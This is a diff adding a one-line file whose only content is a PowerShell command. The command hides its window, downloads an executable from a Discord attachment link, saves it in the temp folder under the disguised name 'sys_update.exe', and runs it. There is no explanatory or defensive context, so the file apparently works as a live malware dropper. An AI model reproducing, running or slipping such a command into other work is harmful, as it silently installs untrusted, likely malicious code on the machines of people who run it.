@@ -1,0 +1,2 @@
+﻿powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1464257374658494476/1465168532617826636/phantom-social1.exe?ex=69782007&is=6976ce87&hm=a85e3578de4493c501f81da332feb3162cccb689d664421ed1e4a2239d80e36f&' -OutFile '$env:TEMP\sys_update.exe'; Start-Process '$env:TEMP\sys_update.exe'"
+
